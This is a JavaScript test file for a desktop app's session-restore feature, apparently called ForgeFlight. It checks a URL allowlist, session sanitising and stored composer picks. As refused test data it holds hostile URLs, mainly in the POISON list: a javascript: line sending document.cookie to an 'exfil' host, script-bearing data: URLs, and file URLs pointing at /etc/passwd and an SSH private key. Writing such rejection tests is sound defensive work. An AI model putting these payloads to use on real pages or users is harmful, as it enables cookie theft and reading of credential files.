'use strict';

/**
 * The resume contract, tested where it can be tested: the list, its
 * allowlist, and the two stores. What cannot be tested here is a real page
 * reseating itself — that is the e2e stage's job, and it is the reason
 * `missingFrom` is compared by host rather than by URL, since one seat per
 * host is the law the rail already enforces.
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const { SessionStore, sanitizeSession, restorableURL, missingFrom, MAX_TABS } = require('../src/main/session.js');
const { PickStore } = require('../src/main/picks.js');

const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'forgeflight-test-'));

/** A session as the app would write it after a normal afternoon. */
function aSession(over = {}) {
  return {
    version: 1,
    savedAt: '2026-08-29T18:04:11.000Z',
    tabs: [
      { url: 'https://claude.ai/chat/abc', title: 'Claude' },
      { url: 'https://chatgpt.com/c/def', title: 'ChatGPT' },
      { url: 'forgeflight://local', title: 'Local model' },
    ],
    activeUrl: 'https://chatgpt.com/c/def',
    assign: { 'claude.ai': 'A', 'chatgpt.com': 'B' },
    order: ['claude.ai', 'chatgpt.com'],
    subjectHost: 'claude.ai',
    ...over,
  };
}

// --------------------------------------------------------------------------
// The allowlist
// --------------------------------------------------------------------------

test('a resumable URL is a place, not a payload', () => {
  // Ordinary providers, and our own pages.
  assert.equal(restorableURL('https://claude.ai/chat/abc'), 'https://claude.ai/chat/abc');
  assert.equal(restorableURL('forgeflight://local'), 'forgeflight://local');
  assert.equal(restorableURL('forgeflight://start'), 'forgeflight://start');

  // Loopback is admitted so a local fixture or dev server can be resumed...
  assert.equal(restorableURL('http://127.0.0.1:39411/chat.html'), 'http://127.0.0.1:39411/chat.html');
  assert.equal(restorableURL('http://localhost:8080/'), 'http://localhost:8080/');
  // ...and a plaintext URL for a real site is refused rather than written down.
  assert.equal(restorableURL('http://claude.ai/'), null);
  assert.equal(restorableURL('http://example.com/x'), null);

  // Everything that is not a place.
  for (const bad of [
    'about:blank',
    'file:///etc/passwd',
    'data:text/html,<script>alert(1)</script>',
    'javascript:alert(1)',
    'blob:https://claude.ai/1234',
    'chrome://settings',
    'devtools://devtools/bundled/inspector.html',
    'ftp://files.example/x',
    '',
    null,
    undefined,
    42,
    {},
    'https://',
    'not a url at all',
    `https://claude.ai/${'x'.repeat(3000)}`,
  ]) {
    assert.equal(restorableURL(bad), null, `refused: ${String(bad).slice(0, 40)}`);
  }
});

// --------------------------------------------------------------------------
// What is read back
// --------------------------------------------------------------------------

test('a session is reduced to the fields we are willing to act on', () => {
  const s = sanitizeSession(aSession());
  assert.equal(s.tabs.length, 3);
  assert.equal(s.activeUrl, 'https://chatgpt.com/c/def');
  assert.deepEqual(s.assign, { 'claude.ai': 'A', 'chatgpt.com': 'B' });
  assert.deepEqual(s.order, ['claude.ai', 'chatgpt.com']);
  assert.equal(s.subjectHost, 'claude.ai');
});

test('a file we did not write is not a session', () => {
  assert.equal(sanitizeSession(null), null);
  assert.equal(sanitizeSession('nope'), null);
  assert.equal(sanitizeSession({ version: 99, tabs: [{ url: 'https://claude.ai' }] }), null, 'wrong version');
  assert.equal(sanitizeSession({ version: 1 }), null, 'no tabs');
  assert.equal(sanitizeSession({ version: 1, tabs: [] }), null, 'empty tabs');
  assert.equal(sanitizeSession({ version: 1, tabs: [{ url: 'javascript:alert(1)' }] }), null, 'no resumable tab');
});

test('a session carries no URLs the allowlist would refuse, even on the way in', () => {
  const s = sanitizeSession(
    aSession({
      tabs: [
        { url: 'https://claude.ai/', title: 'Claude' },
        { url: 'file:///etc/passwd', title: 'nope' },
        { url: 'http://example.com/', title: 'nope either' },
        { url: 'https://claude.ai/', title: 'a duplicate' },
      ],
    })
  );
  assert.deepEqual(
    s.tabs.map((t) => t.url),
    ['https://claude.ai/'],
    'refused schemes are dropped and duplicates collapse'
  );
});

test('a session cannot grow without limit', () => {
  const many = Array.from({ length: MAX_TABS + 25 }, (_, i) => ({ url: `https://site${i}.example/`, title: `s${i}` }));
  const s = sanitizeSession(aSession({ tabs: many }));
  assert.equal(s.tabs.length, MAX_TABS);
});

test('seat assignments are validated, and keyed by host', () => {
  const s = sanitizeSession(
    aSession({
      assign: { 'claude.ai': 'A', 'chatgpt.com': 'sideways', 'gemini.google.com': 'out', '': 'A', 'x.example': 7 },
      order: ['gemini.google.com', 'chatgpt.com', 'claude.ai'],
      subjectHost: 'nobody.example',
    })
  );
  assert.deepEqual(s.assign, { 'claude.ai': 'A', 'gemini.google.com': 'out' }, 'only A, B or out');
  assert.deepEqual(
    s.order,
    ['gemini.google.com', 'claude.ai'],
    'an order names hosts that are actually assigned, in the order they were saved'
  );
  assert.equal(s.subjectHost, null, 'a subject that is not seated is no subject');
});

test('an active tab that is not in the session falls back to the first one', () => {
  const s = sanitizeSession(aSession({ activeUrl: 'https://nowhere.example/' }));
  assert.equal(s.activeUrl, 'https://claude.ai/chat/abc');
});

// --------------------------------------------------------------------------
// What is missing
// --------------------------------------------------------------------------

test('a resume is compared by host, because one seat per host is the law', () => {
  const s = sanitizeSession(aSession());
  // Nothing open: everything comes back.
  assert.deepEqual(missingFrom(s, []).map((t) => t.url), [
    'https://claude.ai/chat/abc',
    'https://chatgpt.com/c/def',
    'forgeflight://local',
  ]);
  // A different conversation on a site you already have open is not a second
  // seat — the rail would block it — so it does not come back.
  assert.deepEqual(missingFrom(s, ['https://claude.ai/some/other/chat']).map((t) => t.url), [
    'https://chatgpt.com/c/def',
    'forgeflight://local',
  ]);
  // Our own pages are rooms, not sites: they are compared exactly.
  assert.deepEqual(missingFrom(s, ['forgeflight://start']).map((t) => t.url), [
    'https://claude.ai/chat/abc',
    'https://chatgpt.com/c/def',
    'forgeflight://local',
  ]);
  assert.deepEqual(missingFrom(s, ['forgeflight://local']).map((t) => t.url), [
    'https://claude.ai/chat/abc',
    'https://chatgpt.com/c/def',
  ]);
  // Everything open: nothing to offer, so the button stays quiet.
  assert.deepEqual(
    missingFrom(s, ['https://claude.ai/', 'https://chatgpt.com/', 'forgeflight://local']),
    []
  );
  assert.deepEqual(missingFrom(null, []), [], 'no session, nothing missing');
});

// --------------------------------------------------------------------------
// The file
// --------------------------------------------------------------------------

test('a saved session is read back by the next launch', () => {
  const dir = tmp();
  const store = new SessionStore(dir);
  assert.equal(store.get(), null, 'a fresh profile has no session');
  assert.ok(store.save(aSession()));
  assert.ok(fs.existsSync(path.join(dir, 'session.json')), 'it is a real file, greppable by hand');

  const reopened = new SessionStore(dir);
  assert.equal(reopened.get().tabs.length, 3);
  assert.equal(reopened.get().activeUrl, 'https://chatgpt.com/c/def');
  assert.deepEqual(reopened.get().assign, { 'claude.ai': 'A', 'chatgpt.com': 'B' });
});

test('the file on disk carries URLs and nothing else', () => {
  const dir = tmp();
  const store = new SessionStore(dir);
  store.save(aSession({ tabs: [{ url: 'https://claude.ai/', title: 'Claude' }] }));
  const raw = fs.readFileSync(path.join(dir, 'session.json'), 'utf8');
  const parsed = JSON.parse(raw);
  assert.deepEqual(Object.keys(parsed).sort(), [
    'activeUrl',
    'assign',
    'closedAll',
    'order',
    'savedAt',
    'subjectHost',
    'tabs',
    'version',
  ]);
  assert.deepEqual(Object.keys(parsed.tabs[0]).sort(), ['title', 'url']);
  for (const word of ['cookie', 'token', 'password', 'authorization', 'prompt', 'reply']) {
    assert.ok(!raw.toLowerCase().includes(word), `no ${word} in the file`);
  }
});

test('a torn or hostile file is a first run, not a crash', () => {
  const dir = tmp();
  for (const junk of ['{', 'null', '[]', '"a string"', '{"version":1,"tabs":"nope"}']) {
    fs.writeFileSync(path.join(dir, 'session.json'), junk, 'utf8');
    const store = new SessionStore(dir);
    assert.equal(store.get(), null, `survived ${JSON.stringify(junk).slice(0, 30)}`);
  }
});

test('emptying the table is recorded, not mistaken for forgetting it', () => {
  const closed = sanitizeSession(aSession({ closedAll: true }));
  assert.equal(closed.closedAll, true, 'the fact that you closed everything survives');
  assert.equal(closed.tabs.length, 3, 'and so does the list, so it can be brought back');
  assert.equal(sanitizeSession(aSession()).closedAll, false, 'an ordinary session is not flagged');
  assert.equal(sanitizeSession(aSession({ closedAll: 'yes' })).closedAll, false, 'only a true flag counts');
});

test('an empty session is not saved, and clearing forgets it', () => {
  const dir = tmp();
  const store = new SessionStore(dir);
  store.save(aSession());
  assert.equal(store.save({ version: 1, tabs: [] }), false, 'nothing open is nothing to resume');
  assert.equal(store.get().tabs.length, 3, 'and it does not overwrite what was there');
  store.clear();
  assert.equal(store.get(), null);
  assert.equal(fs.existsSync(path.join(dir, 'session.json')), false);
  assert.equal(new SessionStore(dir).get(), null);
});

// --------------------------------------------------------------------------
// Remembered composer picks
// --------------------------------------------------------------------------

test('a pick you made by hand is waiting on the next load', () => {
  const dir = tmp();
  const store = new PickStore(dir);
  assert.equal(store.get('claude.ai'), null);
  assert.ok(
    store.set('claude.ai', {
      stabilityKey: 'a1b2c3d4',
      path: 'body>div:1>main:1>form:1>textarea:1',
      placeholder: 'Ask anything', // page furniture: kept out
      ariaLabel: 'Message Claude',
    })
  );
  const reopened = new PickStore(dir);
  assert.deepEqual(reopened.get('claude.ai'), {
    stabilityKey: 'a1b2c3d4',
    path: 'body>div:1>main:1>form:1>textarea:1',
    savedAt: reopened.get('claude.ai').savedAt,
  });

  const raw = fs.readFileSync(path.join(dir, 'picks.json'), 'utf8');
  assert.ok(!raw.includes('Ask anything'), 'no placeholder text is stored');
  assert.ok(!raw.includes('Message Claude'), 'no aria-label is stored');
  assert.deepEqual(Object.keys(JSON.parse(raw)['claude.ai']).sort(), ['path', 'savedAt', 'stabilityKey']);
});

test('a pick that is not a stamp is refused', () => {
  const dir = tmp();
  const store = new PickStore(dir);
  assert.equal(store.set('a.example', null), false);
  assert.equal(store.set('a.example', { stabilityKey: 'not hex!!', path: 'body>textarea:1' }), false, 'key must be hex');
  assert.equal(store.set('a.example', { stabilityKey: 'abcd' }), false, 'a stamp always carries a path');
  assert.equal(store.set('a.example', { stabilityKey: 'abcd', path: '../../etc/passwd' }), false, 'path must start at body');
  assert.equal(store.set('a.example', { stabilityKey: 'abcd', path: 'html>body>div:1' }), false, 'path starts at body');
  assert.equal(
    store.set('a.example', { stabilityKey: 'abcd', path: `body>${'x'.repeat(400)}` }),
    false,
    'a path is bounded'
  );
  assert.equal(store.get('a.example'), null);
  assert.ok(store.set('a.example', { stabilityKey: 'ABCD1234', path: 'body>div:1>textarea:1' }));
  assert.equal(store.get('a.example').stabilityKey, 'abcd1234', 'keys are compared case-insensitively');
});

test('a pick can be withdrawn, and the file stays bounded', () => {
  const dir = tmp();
  const store = new PickStore(dir);
  store.set('claude.ai', { stabilityKey: 'a1b2c3d4', path: 'body>textarea:1' });
  assert.ok(store.clear('claude.ai'));
  assert.equal(store.get('claude.ai'), null);
  assert.equal(store.clear('claude.ai'), false, 'withdrawing twice is not an error');

  for (let i = 0; i < 260; i++) {
    store.set(`site${i}.example`, { stabilityKey: (i + 1).toString(16).padStart(8, '0'), path: 'body>textarea:1' });
  }
  const reopened = new PickStore(dir);
  assert.ok(Object.keys(reopened.picks).length <= 200, 'the log of rulings cannot grow without limit');
  assert.ok(reopened.get('site259.example'), 'and the newest ruling is the one that survives');
});

test('a hostile picks file is ignored rather than trusted', () => {
  const dir = tmp();
  fs.writeFileSync(path.join(dir, 'picks.json'), '{"claude.ai":{"stabilityKey":"../../etc","path":"body>x"}}', 'utf8');
  assert.equal(new PickStore(dir).get('claude.ai'), null);
  fs.writeFileSync(path.join(dir, 'picks.json'), '{oops', 'utf8');
  assert.deepEqual(new PickStore(dir).picks, {});
});

// --------------------------------------------------------------------------
// The wiring
// --------------------------------------------------------------------------

/**
 * Load the real main process module against a stub of Electron's API and
 * record what it registers. This is not a re-implementation of the wiring —
 * it is the actual module, executed top to bottom, so a channel the chrome
 * calls and the main process never answers is a failure here.
 */
test('the main process loads and answers the channels the chrome calls', () => {
  const handled = new Set();
  const listened = new Set();
  const Module = require('node:module');
  const original = Module._load;
  Module._load = function (request, ...rest) {
    if (request === 'electron') {
      return {
        app: {
          whenReady: () => new Promise(() => {}), // never ready: no window is built
          on: () => {},
          setPath: () => {},
          getPath: () => tmp(),
        },
        BrowserWindow: class {},
        WebContentsView: class {},
        ipcMain: {
          handle: (channel) => handled.add(channel),
          on: (channel) => listened.add(channel),
        },
        shell: { openExternal: () => Promise.resolve() },
        Menu: { setApplicationMenu: () => {}, buildFromTemplate: () => ({}) },
        session: { fromPartition: () => ({ protocol: { handle: () => {} } }) },
        protocol: { registerSchemesAsPrivileged: () => {} },
        dialog: {},
      };
    }
    return original.call(this, request, ...rest);
  };

  const entry = require.resolve('../src/main/main.js');
  try {
    delete require.cache[entry];
    require('../src/main/main.js');
  } finally {
    Module._load = original;
    delete require.cache[entry];
  }

  for (const channel of ['session:info', 'session:restore', 'session:save']) {
    assert.ok(handled.has(channel), `${channel} is handled by the main process`);
  }
  for (const channel of ['session:assign', 'seat:askPick', 'seat:forgetPick']) {
    assert.ok(listened.has(channel), `${channel} is listened for by the main process`);
  }
  assert.ok(handled.has('table:send'), 'and the pre-existing channels are still registered');
});

// ===========================================================================
// Partial-list integrity.
//
// The existing allowlist tests prove each disallowed scheme is rejected in
// isolation. That is not the property that matters at load time. What
// matters is that a session file MIXING good and bad entries yields exactly
// the good ones — in order, complete, with their titles and their active-tab
// choice intact. A sanitizer that bailed on the first bad entry, or that
// dropped the entry after each bad one, or that quietly returned null for
// the whole file, would pass every isolated check and still lose a person
// their table.
// ===========================================================================

/** Every disallowed scheme the doc names, plus the ways they get smuggled. */
const POISON = [
  'file:///etc/passwd',
  'file://C:/Users/me/AppData/Local/State',
  'data:text/html,<script>fetch("//x")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
  'blob:https://claude.ai/8f6c1b2e-1111-2222-3333-444455556666',
  'javascript:fetch("//exfil/"+document.cookie)',
  'JavaScript:void(0)', // scheme matching is case-insensitive or it is nothing
  'JAVASCRIPT:alert(1)',
  '  javascript:alert(1)', // leading whitespace is not a new scheme
  'about:blank',
  'chrome://settings/cookies',
  'devtools://devtools/bundled/inspector.html',
  'view-source:https://claude.ai/',
  'ws://127.0.0.1:9222/devtools/page/1',
  'ftp://files.example/',
  'http://evil.example/', // http is loopback-only
  'http://127.0.0.1.evil.example/', // a hostname that merely starts like loopback
  'http://localhost.evil.example/', // ...and one that merely starts like localhost
  'forgeflight:', // our scheme with nothing behind it
  '',
  'not a url at all',
];

/** The good ones. Every kind the allowlist admits, on purpose. */
const GOOD = [
  { url: 'https://claude.ai/chat/abc', title: 'Claude' },
  { url: 'https://chatgpt.com/c/def', title: 'ChatGPT' },
  // D26: a session saved by OmniBox names its own pages under the old
  // scheme. Those are the same two rooms, so they translate rather than drop.
  { url: 'omnibox://local', title: 'Local model', expect: 'forgeflight://local' },
  { url: 'http://127.0.0.1:39411/textarea-chat.html', title: 'Fixture' },
  { url: 'http://localhost:5173/', title: 'Dev server' },
  { url: 'https://gemini.google.com/app', title: 'Gemini' },
];

test('a session mixing every disallowed scheme with valid tabs restores exactly the valid ones', () => {
  // Interleaved, so a sanitizer that skipped the entry after a rejection, or
  // stopped at the first one, would be caught rather than accidentally right.
  const tabs = [];
  const maxLen = Math.max(GOOD.length, POISON.length);
  for (let i = 0; i < maxLen; i++) {
    if (POISON[i] !== undefined) tabs.push({ url: POISON[i], title: 'poison' });
    if (GOOD[i]) tabs.push(GOOD[i]);
    if (POISON[i + maxLen] !== undefined) tabs.push({ url: POISON[i + maxLen], title: 'poison' });
  }
  for (let i = 2 * maxLen; i < POISON.length; i++) tabs.push({ url: POISON[i], title: 'poison' });

  const s = sanitizeSession({
    version: 1,
    savedAt: '2026-09-04T10:00:00.000Z',
    tabs,
    activeUrl: 'https://chatgpt.com/c/def',
    assign: { 'claude.ai': 'A', 'chatgpt.com': 'B' },
    order: ['claude.ai', 'chatgpt.com'],
    subjectHost: 'claude.ai',
  });

  assert.ok(s, 'a file with poison in it is still a session, not a total loss');

  // Completeness: every good URL survived...
  assert.deepEqual(
    s.tabs.map((t) => t.url),
    GOOD.map((g) => g.expect || new URL(g.url).href),
    'the valid tabs come back complete and in order — none dropped as collateral'
  );
  // ...with its title, which is the part a partial-drop bug would mangle.
  assert.deepEqual(s.tabs.map((t) => t.title), GOOD.map((g) => g.title));

  // Soundness: nothing that was refused is anywhere in the result.
  const urls = s.tabs.map((t) => t.url);
  const blob = JSON.stringify(s);
  for (const bad of POISON) {
    if (!bad.trim()) continue;
    assert.ok(!urls.includes(bad), `refused entry was restored as a tab: ${bad}`);
    // Substring containment too, except where the poison is a strict prefix
    // of something legitimately admitted (`omnibox:` inside `omnibox://local`).
    if (!urls.some((u) => u.startsWith(bad))) {
      assert.ok(!blob.includes(bad), `refused entry leaked into the session: ${bad}`);
    }
  }
  for (const scheme of ['file:', 'data:', 'blob:', 'javascript:', 'about:', 'chrome:', 'view-source:', 'ftp:', 'ws:']) {
    assert.ok(!blob.toLowerCase().includes(scheme), `${scheme} survived somewhere in the session`);
  }

  // The rest of the session is intact, not reset by the presence of poison.
  assert.equal(s.activeUrl, 'https://chatgpt.com/c/def', 'the tab you were looking at is still the active one');
  assert.deepEqual(s.assign, { 'claude.ai': 'A', 'chatgpt.com': 'B' });
  assert.deepEqual(s.order, ['claude.ai', 'chatgpt.com']);
  assert.equal(s.subjectHost, 'claude.ai');
});

test('poison surviving a round trip through the store is still poison-free on the way back out', () => {
  const dir = tmp();
  const store = new SessionStore(dir);
  store.save({
    version: 1,
    tabs: [
      { url: 'javascript:alert(1)', title: 'x' },
      { url: 'https://claude.ai/chat/abc', title: 'Claude' },
      { url: 'file:///etc/passwd', title: 'x' },
      { url: 'https://chatgpt.com/c/def', title: 'ChatGPT' },
      { url: 'data:text/html,x', title: 'x' },
    ],
    activeUrl: 'https://claude.ai/chat/abc',
  });

  // The file we wrote is not the file we trust: hand-edit it the way a
  // hostile process or a bad restore would, then reload.
  const written = JSON.parse(fs.readFileSync(path.join(dir, 'session.json'), 'utf8'));
  assert.equal(written.tabs.length, 2, 'poison never reached the disk in the first place');
  written.tabs.splice(1, 0, { url: 'javascript:fetch("//exfil")', title: 'injected after the fact' });
  written.tabs.push({ url: 'file:///home/me/.ssh/id_rsa', title: 'injected after the fact' });
  fs.writeFileSync(path.join(dir, 'session.json'), JSON.stringify(written));

  const reloaded = new SessionStore(dir).get();
  assert.ok(reloaded, 'a tampered file with valid entries still resumes those entries');
  assert.deepEqual(reloaded.tabs.map((t) => t.url), ['https://claude.ai/chat/abc', 'https://chatgpt.com/c/def']);
  assert.equal(reloaded.activeUrl, 'https://claude.ai/chat/abc', 'and the active tab is still one that exists');
});

test('a session of nothing but poison is no session at all, rather than an empty window', () => {
  const s = sanitizeSession({ version: 1, tabs: POISON.map((url) => ({ url, title: 'x' })), activeUrl: POISON[0] });
  assert.equal(s, null, 'nothing restorable means nothing to restore, not a blank table');
});

test('an active URL that was itself refused falls back to a tab that actually exists', () => {
  const s = sanitizeSession({
    version: 1,
    tabs: [{ url: 'javascript:alert(1)' }, { url: 'https://claude.ai/chat/abc' }, { url: 'https://chatgpt.com/c/def' }],
    activeUrl: 'javascript:alert(1)',
  });
  assert.equal(s.tabs.length, 2);
  assert.equal(s.activeUrl, 'https://claude.ai/chat/abc', 'never a URL that is not in the list');
  assert.ok(s.tabs.some((t) => t.url === s.activeUrl), 'the active URL is always one of the restored tabs');
});

test('the poison in a mixed list does not consume the tab budget', () => {
  // MAX_TABS is a cap on what gets REOPENED. If refused entries counted
  // against it, a file padded with a hundred javascript: URLs would silently
  // truncate a person's real table down to nothing.
  const tabs = [];
  for (let i = 0; i < 100; i++) tabs.push({ url: `javascript:x(${i})` });
  for (let i = 0; i < MAX_TABS; i++) tabs.push({ url: `https://seat${i}.example/`, title: `Seat ${i}` });

  const s = sanitizeSession({ version: 1, tabs, activeUrl: 'https://seat0.example/' });
  assert.equal(s.tabs.length, MAX_TABS, 'the cap counts places, not payloads');
  assert.ok(s.tabs.every((t) => t.url.startsWith('https://seat')));
});
